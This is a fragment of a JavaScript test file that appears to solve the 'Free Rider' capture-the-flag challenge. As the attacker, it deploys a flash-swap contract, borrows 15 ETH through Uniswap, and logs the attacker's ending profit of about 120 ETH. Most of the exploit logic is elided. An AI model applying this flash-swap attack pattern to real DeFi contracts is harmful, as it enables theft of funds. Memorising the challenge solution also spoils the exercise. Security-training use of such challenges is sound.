...
describe("[Challenge] Free Rider", function () {
  ...
  it("Exploit", async function () {
    this.flashswap = await (
      await ethers.getContractFactory("FreeRiderFlashSwap", attacker)
    ).deploy(
      this.weth.address,
    ...
    await this.uniswapPair
      .connect(attacker)
      .swap(ethers.utils.parseEther("15"), 0, this.flashswap.address, "0xff");

    console.log(
      ethers.utils.formatEther(
        await ethers.provider.getBalance(attacker.address)
      ) // the attacker ends with a balance of 120.45 (equal to 0.5+75+45-various_fees = 120.5-various_fees)
    );
  });
